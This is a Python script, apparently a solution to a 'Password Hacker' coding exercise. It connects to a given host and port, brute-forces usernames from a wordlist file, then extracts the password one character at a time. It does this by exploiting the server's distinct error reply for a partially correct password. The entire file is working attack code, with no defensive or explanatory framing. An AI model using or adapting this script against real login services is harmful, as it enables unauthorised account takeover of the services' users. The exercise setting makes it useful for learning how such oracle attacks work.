from argparse import ArgumentParser
from inspect import stack
from json import dumps, loads
from socket import socket
from string import ascii_letters, digits

LOGINS = r"C:\Users\filip\OneDrive\PycharmProjects\Password Hacker (Python)\logins.txt"

ALPHABET = ascii_letters + digits

WRONG_LOGIN = {"result": "Wrong login!"}
WRONG_PASSWORD = {"result": "Wrong password!"}
BAD_REQUEST = {"result": "Bad request!"}
EXCEPTION = {"result": "Exception happened during login"}
SUCCESS = {"result": "Connection success!"}


class Credentials(dict):
    def __init__(self, login: str, password: str):
        super().__init__(login=login, password=password)

    def to_json(self, indent=None):
        return dumps(self, indent=indent)


def get_address() -> tuple[str, int]:
    parser = ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    args = parser.parse_args()

    return args.host, args.port


def get_logins():
    with open(LOGINS) as f:
        logins = (line.strip() for line in f)
        yield from logins
        raise LookupError(f"{LOGINS=} exhausted without a match!")


def get_passwords():
    password = ""
    while True:
        for character in ALPHABET:
            match = yield password + character
            if match:
                password = match
                yield  # Give None to the send method
                break

        else:
            raise LookupError(f"{ALPHABET=} exhausted without a match!")


def brute_force(client, login=None):
    generator = get_logins() if login is None else get_passwords()

    for candidate in generator:
        if login is None:
            credentials = (candidate, " ")
        else:
            credentials = (login, candidate)

        credentials = Credentials(*credentials)

        client.send(credentials.to_json().encode())
        response = client.recv(1024).decode()
        response = loads(response)

        if login is None and response == WRONG_PASSWORD:
            # Found login
            return candidate
        elif response == EXCEPTION:
            # Found partial password
            generator.send(candidate)
            continue
        elif response == SUCCESS:
            # Found password
            return candidate
        elif login and response == WRONG_LOGIN:
            function = stack()[0][3]
            raise ValueError(f"Bad login passed into {function}! {login=}")
        elif response == BAD_REQUEST:
            raise ValueError(f"Bad credentials! {credentials=}")


def main():
    address = get_address()

    with socket() as client:
        client.connect(address)

        login = brute_force(client)
        password = brute_force(client, login)

    credentials = Credentials(login, password)
    print(credentials.to_json())


if __name__ == "__main__":
    main()
